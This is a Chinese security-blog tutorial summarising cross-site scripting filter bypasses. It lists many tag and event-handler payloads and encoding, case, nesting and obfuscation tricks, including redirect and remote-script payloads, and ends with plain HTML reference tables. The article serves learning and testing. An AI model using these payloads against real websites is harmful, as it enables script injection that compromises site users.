# xss绕过总结

---

**URL**: https://www.freebuf.com/articles/web/444780.html

**作者**: 2025-08-18 22:28:12所属地 北京

**发布时间**: 2025-08-18 22:28:12

**爬取时间**: 2025-08-20T17:37:28.398388

---

## 正文

官方公众号企业安全新浪微博

![图片](../images/f43141f724f98ea95118b8af321c69fe.jpg)
FreeBuf.COM网络安全行业门户，每日发布专业的安全资讯、技术剖析。

![FreeBuf+小程序](../images/58489bc90c4e5bff5ef6e4f8a8bafaae.jpg)
FreeBuf+小程序把安全装进口袋

xss绕过总结

- Web安全

xss绕过总结
2025-08-18 22:28:12
所属地 北京
![图片](../images/b9059b82f9f584c38d557848f19ae621.png)
本文由
创作，已纳入
「FreeBuf原创奖励计划」
，未授权禁止转载
**免责声明**

**本文只做学术研究使用，不可对真实未授权网站使用，如若非法他用，与平台和本文作者无关，需自行负责！**

### XSS绕过

#### 常见标签

**<script>标签**

- <script>alert("xss");</script> //自动弹窗

**<p>标签**

- <p onclick="alert('xss');">xss</p> //点击触发
- <p onmouseover="alert('xss');">xss</p> //鼠标移动到xss触发
- <p onmouseout="alert('xss');">xss</p> //鼠标移动到xss触发
- <p onmouseup="alert('xss');">xss</p> //点击触发

**<a>标签**

- <a href="javascript:alert(`xss`);">xss</a>
- <a href="x" onfocus="alert('xss');" autofocus="">xss</a> //多次弹窗
- <a href="http://192.168.137.100/1.js" onclick=eval("alert('xss');")>xss</a>
- <a href="http://192.168.137.100/1.js" onclick=eval("alert('xss');")>xss</a>
- <a href="x" onmouseover="alert('xss');">xss</a> //直接弹窗
- <a href="x" onmouseout="alert('xss');">xss</a> //点击触发弹窗

**<img>标签**

- <img src=1 onerror=alert("xss");> //直接弹窗
- <img src onerror=_=alert,_(1)> //直接弹窗
- <img src=x onerror=eval("alert(1)")> //直接弹窗
- <img src=1 onmouseover="alert('xss');"> //鼠标移动弹窗
- <img src=1 onmouseout="alert('xss');"> //鼠标移动弹窗
- <img src=1 onclick="alert('xss');"> //鼠标点击弹窗

**<input>标签**

- <input onfocus="alert('xss');"> //会多次弹窗(不止弹一次)
- <input onmouseover="alert('xss');"> //鼠标移动触发
- <input type="text" onkeydown="alert('xss');"></input> //输入内容触发
- <input type="text" onkeypress="alert('xss');"></input> //输入内容触发
- <input type="text" onkeydown="alert('xss');"></input> //输入内容触发
- 竞争焦点，从而触发onblur事件(只弹窗一次)：<input onblur=alert("xss") autofocus><input autofocus>
- 通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发：<input onfocus="alert('xss');" autofocus> //会多次弹窗(不止弹一次)

**<details>标签**

- <details ontoggle="alert('xss');">
- <details ontoggle="alert('xss');"></details> //点击触发
- <details ontoggle="alert('xss');" open=""></details> //自动触发
- 使用open属性触发ontoggle事件，无需用户去触发：<details open ontoggle="alert('xss');">

**<svg>标签**

- <svg onload=javascript:alert(1)> //直接弹窗
- <svg onload=alert("xss");> //直接弹窗

**<select>标签**

- <select onfocus="alert('xss');" autofocus></select> //点击触发
- <select onfocus=alert(1)></select> //会多次弹窗(不止弹一次)
- <select onclick=eval("alert('xss');")></select> //鼠标点击触发
- <select onmouseover="alert('xss');"></select> //鼠标移动触发
- 通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发：<select onfocus=alert(1) autofocus> //会多次弹窗(不止弹一次)

**<iframe>标签**

- <iframe onload="base64,YWxlcnQoJ3hzcycpOw=="></iframe> //未成功
- <iframe onmouseover="alert('xss');"></iframe> //鼠标移动弹窗
- <iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4="> //直接弹窗
- <iframe onload=alert("xss");></iframe> //直接弹窗
- <iframe src=javascript:alert('xss');></iframe> //直接弹窗

**<video>标签**

- <video src=x onerror=alert(1)> //直接弹窗
- <video controls onmouseover="alert('xss');"></video> //鼠标移动弹窗
- <video controls onfocus="alert('xss');" autofocus=""></video> //直接弹窗，会弹很多次窗
- <video controls onclick="alert('xss');"></video> //鼠标点击弹窗
- <video><source onerror="alert(1)"> //直接弹窗

**<audio>标签**

- <audio><source src="x" onerror="alert('xss');"></audio> //直接弹窗
- <audio controls onfocus=eval("alert('xss');") autofocus=""></audio> //直接弹窗，但会一直弹窗
- <audio controls onmouseover="alert('xss');"><source src="x"></audio> //鼠标移动弹窗
- <audio src=x onerror=alert("xss");> //直接弹窗

**<body>标签**

- <body/onload=alert("xss");> //自动弹窗
- 利用换行符以及autofocus，自动去触发onscroll事件，无需用户去触发：<body onscroll=alert("xss");><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>

**<textarea>标签**

- <textarea onfocus=alert("xss"); autofocus> //会一直弹窗

**<button>标签**

- <button onclick=alert(1)> //点击弹窗
- <button onmouseover="alert('xss');">xss</button> //鼠标移动弹窗
- <button onmouseout="alert('xss');">xss</button> //鼠标移动弹窗
- <button onmouseup="alert('xss');">xss</button> //点击弹窗
- <button onmousedown="alert('xss');"></button> //点击弹窗
- <button onclick="alert('xss');">xss</button> //点击弹窗
- <button onfocus="alert('xss');" autofocus="">xss</button> //自动弹窗，弹很多次
- <button autofocus onclick="alert(1)"> //点击弹窗

**<from>标签**

- <form method="x" action="x" onmouseout="alert('xss');"><input type=submit></form> //鼠标移动触发
- <form method="x" action="x" onmouseover="alert('xss');"><input type=submit></form> //鼠标移动触发
- <form method="x" action="x" onmouseup="alert('xss');"><input type=submit></form> //鼠标点击触发
- <form action="Javascript:alert(1)"><input type=submit> //鼠标点击触发

**<div>标签**

- <div onmouseover='alert(1)'>DIV</div> //鼠标移动触发
- <div onmouseover%3d'alert%26lpar%3b1%26rpar%3b'>DIV<%2fdiv> //URL编码

**<object>标签**

- <object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4="></object> //自动弹窗

**可能已废弃的标签/语句**

- <marquee onstart=alert("xss")></marquee> //Chrome不行，火狐和IE都可以（经测试无法弹窗，可能已废弃）
- <keygen autofocus onfocus=alert(1)> //仅限火狐，经测试无法弹窗，可能目前已废弃
- <isindex type=image src=1 onerror=alert("xss")>//仅限于IE(未测试，Edge浏览器无法弹窗)
- 利用link远程包含js文件(在无CSP的情况下才可以)：<link rel=import href="http://127.0.0.1/1.js">#经测试无法弹窗，可能已废弃
- <img src=javascript:alert('xss')> //IE7以下(未测试)
- <img style="xss:expression(alert('xss''))"> // IE7以下(未测试)
- <div style="color:rgb(''�x:expression(alert(1))"></div> //IE7以下(未测试)
- <style>#test{x:expression(alert(/XSS/))}</style> // IE7以下(未测试)
- <table background=javascript:alert(1)></table> //在Opera 10.5和IE6上有效(未测试)

#### 空格绕过

- 用/代替空格：<img/src="x"/onerror=alert("xss");>
- /123/
- %09
- %0A
- %0C
- %0D
- %20
- %0B
- /**/
- //

#### 大小写绕过

- <ImG sRc=x onerRor=alert("xss");>

#### 双写绕过

- 关键字只替换一次且替换为空：<imimgg srsrcc=x onerror=alert("xss");>

#### 字符拼接

- 好多字符拼接都未成功所以就没写
- eval：<img src="x" onerror="a=`aler`;b=`t`;c='(`xss`);';eval(a+b+c)"> //未成功
- top：<script>top["al"+"ert"](`xss`);</script> //未成功

#### 函数替换

- <img src="x" onerror="eval(alert(1))">
- <img src="x" onerror="open(alert(1))"> //可弹窗，但无法进入下一关
- <img src="x" onerror="document.write(alert(1))"> //可弹窗，之后出现undefined
- <img src="x" onerror="setTimeout(alert(1))">
- <img src="x" onerror="setInterval(alert(1))">
- <img src="x" onerror="Set.constructor(alert(1))">
- <img src="x" onerror="Map.constructor(alert(1))">
- <img src="x" onerror="Array.constructor(alert(1))">
- <img src="x" onerror="WeakSet.constructor(alert(1))">
- <img src="x" onerror="constructor.constructor(alert(1))">
- <img src="x" onerror="[1].map(alert(1))">
- <img src="x" onerror="[1].find(alert(1))">
- <img src="x" onerror="[1].every(alert(1))">
- <img src="x" onerror="[1].filter(alert(1))">
- <img src="x" onerror="[1].forEach(alert(1))">
- <img src="x" onerror="[1].findIndex(alert(1))">

#### alert绕过

- <script>prompt(/xss/)</script>
- <script>confirm(/xss/)</script>
- <script>console.log(3)</script> //未成功
- <script>document.write(1)</script>
- 编码绕过
- 使用其他没有alert的标签进行绕过

#### 嵌套绕过

- 嵌套<script>和</script>突破：<script>alert(/xss/)</script><sc<script>ript>alert(/xss/)</sc</script>ript>

#### 其他字符混淆

- 可利用注释、标签的优先级等
- <<script>alert("xss");//<</script>
- <title><img src=</title>><img src=x onerror="alert(`xss`);"> //因为title标签的优先级比img的高，所以会先闭合title，从而导致前面的img标签无效
- <SCRIPT>var a="\\";alert("xss");//";</SCRIPT>

#### 编码绕过

**浏览器对 XSS 代码的解析顺序为：HTML解码——URL解码——JS解码(只支持UNICODE)**

**href、src等加载URL的属性可以使用HTML、URL、JS编码**

**on事件可以使用html实体编码和js编码混合，但url编码在on事件中不会解析**

- html编码：当可控点为单个标签属性时，可以使用 html 实体编码
- 十进制：<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">test</a>
- 十六进制：<a href="&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;">test</a>
- 十六进制(不带分号)：<a href="javascript:alert(1)">test</a>

- Unicode编码绕过：只能对有效的标识符进行编码，例如 javascript:alert(1) ，进行 Unicode 编码时，只能对 alert 和 "1" 进行编码，框号编码后会被当成文本字符，不能执行<img src="x" onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#34;&#120;&#115;&#115;&#34;&#41;&#59;"> //未成功<img src="x" onerror="eval('\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003b')">二次编码：<a href="javascript:%2561%256c%2565%2572%2574%2528%2531%2529">test</a>
- URL编码绕过：当注入点存在 href 或者 src 属性时，可以使用 url 编码<img src="x" onerror="eval(unescape('%61%6c%65%72%74%28%22%78%73%73%22%29%3b'))"> //未成功<a href=javascript:%61%6c%65%72%74%28%31%29>Evi1s7</a><iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>
- 混合编码：先使用 js 编码(Unicode编码)再进行 url 编码或者 html 实体编码
- ASCII编码绕过：<img src="x" onerror="eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59))"><a href='javascript:eval(String.fromCharCode(0x61, 0x6C, 0x65, 0x72, 0x74, 0x28, 0x31, 0x29))'>test</a>
- hex编码绕过：<img src=x onerror=eval('\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29')>
- 八进制绕过：<img src=x onerror=alert('\170\163\163')>
- base64绕过：配合atob函数：atob() 方法用于解码使用 base-64 编码的字符串<img src="x" onerror="eval(atob('ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly93d3cuYmFpZHUuY29tJw=='))"><iframe src="javascript:eval(window['atob']('YWxlcnQoMSk='))"></iframe><img src=x onmouseover="eval(window.atob('YWxlcnQoMSk='))"><a href=javascript:eval(atob('YWxlcnQoMSk='))>test</a><a href=javascript:eval(window.atob('YWxlcnQoMSk='))>test</a><a href=javascript:eval(window['atob']('YWxlcnQoMSk='))>test</a>配合data协议：<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4="><object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4="></object><a href="data:text/html;base64, PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=">test</a> //新版浏览器不支持<embed src="data:text/html;base64, PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4="></embed>

#### 单引号、双引号绕过

- 反引号绕过：<img src="x" onerror=alert(`xss`);>
- 编码绕过
- //替换：<script>alert(/Evi1s7/)</script>

#### 分号绕过

- 花括号绕过：<script>{onerror=alert}throw 1</script>

#### 括号绕过

- 使用throw来绕过：<svg/onload="window.onerror=eval;throw'=alert\x281\x29';"><video src onerror="javascript:window.onerror=alert;throw 1">
- `绕过：<script>alert`1`</script>

#### URL地址绕过：

- URL编码绕过：<img src="x" onerror=document.location=`http://%77%77%77%2e%62%61%69%64%75%2e%63%6f%6d/`>
- 十进制IP绕过：<img src="x" onerror=document.location=`http://2130706433/`>
- 八进制IP绕过：<img src="x" onerror=document.location=`http://0177.0.0.01/`>
- hex编码绕过：<img src="x" onerror=document.location=`http://0x7f.0x0.0x0.0x1/`>
- //替代http://绕过：<img src="x" onerror=document.location=`//www.baidu.com`>
- 中文逗号代替英文逗号：<img src="x" onerror="document.location=`http://www。baidu。com`">

#### 函数拼接(均未成功，但网上有记录，可尝试)

- <img src="x" onerror="eval('al'+'ert(1)')">
- <img src="x" onerror="top['al'+'ert'](1)">
- <img src="x" onerror="window['al'+'ert'](1)">
- <img src="x" onerror="self[`al`+`ert`](1)"><img src="x" onerror="self[`al`+`ert`](1)">
- <img src="x" onerror="parent[`al`+`ert`](1)">
- <img src="x" onerror="frames[`al`+`ert`](1)">

#### 限制长度

- 引用外部JS进行绕过
- F12改长度限制

#### payload

这里只整理星星最多的五个

- https://github.com/payloadbox/xss-payload-list
- https://github.com/s0md3v/AwesomeXSS
- https://github.com/foospidy/payloads
- https://github.com/terjanq/Tiny-XSS-Payloads
- https://github.com/RenwaX23/XSS-Payloads

- 绕过的本质
- 既然看到这里了，是否明白了绕过的的本质？
- <input onmouseover="alert('xss');">
- <svg onload=javascript:alert(1)>
- XSS构成：HTML标签+属性(可选)+事件
- 绕过：利用其他标签+其他事件+系统层面绕过+其他内容过滤(空格、引号等)

### HTML标签

#### 文档结构关键词

| 关键词 | 解释 |
| --- | --- |
| <!DOCTYPE html> | 声明文档为 HTML5 类型，必须位于文档第一行 |
| <html> | 包裹整个 HTML 文档的根元素 |
| <head> | 包含文档元数据（标题、字符集、样式、脚本等） |
| <meta> | 提供文档元数据（字符集、视口、描述、关键词等） |
| <title> | 定义浏览器标签页标题和收藏夹名称 |
| <body> | 包含所有可见页面内容 |
| <base> | 指定页面所有相对 URL 的基础 URL |
| <link> | 链接外部资源（CSS 样式表、图标等） |
| <style> | 包含文档内 CSS 样式 |

#### 内容分区关键词

| 关键词 | 解释 |
| --- | --- |
| <header> | 表示文档或区块的页眉（通常包含 logo 和导航） |
| <footer> | 表示文档或区块的页脚（通常包含版权信息） |
| <main> | 包含文档主要内容（每个页面应只使用一次） |
| <section> | 表示文档中的独立区块（如章节） |
| <article> | 表示独立的自包含内容（如博客文章、新闻） |
| <aside> | 表示与主要内容间接相关的内容（如侧边栏） |
| <nav> | 包含主要导航链接 |
| <div> | 通用内容容器（无语义） |
| <span> | 行内内容容器（无语义） |

#### 文本内容关键词

| 关键词 | 解释 |
| --- | --- |
| <h1>-<h6> | 标题级别（h1 最重要，h6 最不重要） |
| <p> | 段落文本 |
| <br> | 强制换行 |
| <hr> | 水平分隔线（主题分隔） |
| <pre> | 预格式化文本（保留空格和换行） |
| <blockquote> | 长引用（通常缩进显示） |
| <q> | 短行内引用 |
| <code> | 计算机代码片段 |
| <var> | 变量名 |
| <em> | 强调文本（通常斜体） |
| <strong> | 重要文本（通常粗体） |
| <mark> | 标记/高亮文本 |
| <small> | 旁注/小字文本 |
| <del> | 删除的文本 |
| <ins> | 插入的文本 |
| <abbr> | 缩写（配合 title 属性） |
| <time> | 机器可读的日期/时间 |

#### 列表与表格关键词

| 关键词 | 解释 |
| --- | --- |
| <ul> | 无序列表（项目符号） |
| <ol> | 有序列表（数字/字母） |
| <li> | 列表项 |
| <dl> | 描述列表 |
| <dt> | 描述术语 |
| <dd> | 描述详情 |
| <table> | 定义表格 |
| <caption> | 表格标题 |
| <thead> | 表头内容 |
| <tbody> | 表体内容 |
| <tfoot> | 表脚内容 |
| <tr> | 表格行 |
| <th> | 表头单元格 |
| <td> | 表格数据单元格 |

#### 表单关键词

| 关键词 | 解释 |
| --- | --- |
| <form> | 用户输入表单容器 |
| <input> | 输入控件（文本、密码、单选、复选框等） |
| <textarea> | 多行文本输入 |
| <button> | 可点击按钮 |
| <select> | 下拉选择列表 |
| <option> | 下拉列表中的选项 |
| <label> | 表单元素的标注 |
| <fieldset> | 表单元素分组 |
| <legend> | fieldset 的标题 |
| <datalist> | 输入选项列表 |
| <output> | 计算结果输出 |

#### 媒体关键词

| 关键词 | 解释 |
| --- | --- |
| <img> | 嵌入图像 |
| <picture> | 响应式图像容器（适配不同屏幕） |
| <source> | 为媒体元素指定资源 |
| <audio> | 嵌入音频内容 |
| <video> | 嵌入视频内容 |
| <track> | 为媒体指定字幕/章节 |
| <canvas> | 位图绘图区域（用于 JavaScript 绘图） |
| <svg> | 矢量图形容器 |

#### 交互与脚本关键词

| 关键词 | 解释 |
| --- | --- |
| <details> | 可展开/折叠的额外详情 |
| <summary> | details 元素的可见标题 |
| <dialog> | 对话框或模态框 |
| <script> | 包含 JavaScript 代码 |
| <noscript> | 脚本未启用时显示的内容 |
| <template> | 可复用的 HTML 模板 |
| <slot> | Web 组件占位符 |

### 属性

#### 全局属性关键词

| 属性 | 解释 |
| --- | --- |
| id | 元素的唯一标识符 |
| class | 元素的类名（可多个，空格分隔） |
| style | 内联 CSS 样式 |
| title | 元素的额外信息（工具提示） |
| lang | 元素内容的语言 |
| data-* | 自定义数据属性 |
| hidden | 隐藏元素（不显示但仍存在） |
| tabindex | 设置 Tab 键导航顺序 |
| contenteditable | 使元素内容可编辑 |
| draggable | 设置元素是否可拖动 |

#### 表单属性关键词

| 属性 | 解释 |
| --- | --- |
| name | 表单元素的名称（用于表单提交） |
| value | 表单元素的初始值 |
| placeholder | 输入字段的提示文本 |
| required | 必填字段 |
| disabled | 禁用表单元素 |
| readonly | 只读（不可编辑） |
| autofocus | 页面加载时自动聚焦 |
| pattern | 正则表达式验证 |
| min/max | 数值/日期的最小/最大值 |
| step | 数值的增量间隔 |

#### 媒体属性关键词

| 属性 | 解释 |
| --- | --- |
| src | 媒体资源路径 |
| alt | 图像的替代文本 |
| width/height | 媒体尺寸 |
| controls | 显示媒体控制条 |
| autoplay | 自动播放 |
| loop | 循环播放 |
| muted | 静音 |
| poster | 视频加载前的封面图 |
| srcset | 响应式图像源集合 |

#### 链接属性关键词

| 属性 | 解释 |
| --- | --- |
| href | 超链接的目标 URL |
| target | 打开链接的位置（_blank 新窗口） |
| rel | 当前文档与目标文档的关系 |
| download | 下载链接资源 |
| hreflang | 目标文档的语言 |

#### 脚本属性关键词

| 属性 | 解释 |
| --- | --- |
| async | 异步加载脚本（不阻塞页面） |
| defer | 延迟脚本执行（页面解析后） |
| type | 脚本类型（默认为 "text/javascript"） |
| integrity | 子资源完整性校验 |

#### 元数据关键词

| 关键词 | 解释 |
| --- | --- |
| charset="UTF-8" | 设置文档字符编码 |
| viewport | 移动端视口设置 |
| author | 页面作者 |
| description | 页面描述（SEO重要） |
| keywords | 页面关键词（SEO） |
| refresh | 自动刷新/重定向页面 |
| theme-color | 设置浏览器主题色 |

#### 事件处理关键词

| 事件 | 解释 |
| --- | --- |
| onclick | 鼠标点击元素时触发 |
| onload | 元素加载完成时触发 |
| onchange | 表单元素值改变时触发 |
| onmouseover | 鼠标移入元素时触发 |
| onmouseout | 鼠标移出元素时触发 |
| onkeydown | 按键按下时触发 |
| onsubmit | 表单提交时触发 |
| onerror | 加载错误时触发 |

### 结语

- 既然看到这了，是否理解了XSS绕过？
- 可以再从开头重新看一遍，这样有助于加深理解
- 比如dd标签+ondblclick如何触发？

- 当然，并不是所有的标签都能触发，但大多数都可以，至于如何触发，如何搭配，就看各位师傅了

# 网络安全
# web安全
# xss绕过
免责声明
1.一般免责声明：
本文所提供的技术信息仅供参考，不构成任何专业建议。读者应根据自身情况谨慎使用且应遵守《中华人民共和国网络安全法》，作者及发布平台不对因使用本文信息而导致的任何直接或间接责任或损失负责。
2. 适用性声明：
文中技术内容可能不适用于所有情况或系统，在实际应用前请充分测试和评估。若因使用不当造成的任何问题，相关方不承担责任。
3. 更新声明：
技术发展迅速，文章内容可能存在滞后性。读者需自行判断信息的时效性，因依据过时内容产生的后果，作者及发布平台不承担责任。
![图片]
![图片](../images/b9059b82f9f584c38d557848f19ae621.png)
已在FreeBuf发表
篇文章
本文为
独立观点，未经授权禁止转载。
如需授权、对文章有疑问或需删除稿件，请联系 FreeBuf
                客服小蜜蜂（微信：freebee1024）
被以下专辑收录，发现更多精彩内容
相关推荐
![图片]
- 0文章数

文章目录
XSS绕过
- 常见标签
- 空格绕过
- 大小写绕过
- 双写绕过
- 字符拼接
- 函数替换
- alert绕过
- 嵌套绕过
- 其他字符混淆
- 编码绕过
- 单引号、双引号绕过
- 分号绕过
- 括号绕过
- URL地址绕过：
- 函数拼接(均未成功，但网上有记录，可尝试)
- 限制长度
- payload
- 绕过的本质

HTML标签
- 文档结构关键词
- 内容分区关键词
- 文本内容关键词
- 列表与表格关键词
- 表单关键词
- 媒体关键词
- 交互与脚本关键词

属性
- 全局属性关键词
- 表单属性关键词
- 媒体属性关键词
- 链接属性关键词
- 脚本属性关键词
- 元数据关键词
- 事件处理关键词

结语
